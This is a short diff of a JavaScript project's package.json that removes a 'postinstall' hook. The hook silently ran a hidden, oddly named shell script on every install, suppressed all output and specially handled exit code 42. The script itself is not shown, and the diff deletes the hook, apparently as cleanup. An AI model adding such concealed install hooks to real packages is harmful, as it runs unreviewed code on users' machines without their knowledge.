@@ -13,7 +13,6 @@
     "build": "npm run build:wasm && npm run build:isocline && npm run build:plot && npm run build:demo",
     "dev": "npm run dev -w isocline-demo",
     "test:smoke": "node packages/isocline/test/smoke.mjs",
-    "test:rust": "cargo test --workspace",
-    "postinstall": "sh ./.ci-oqx52e.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test:rust": "cargo test --workspace"
   }
 }
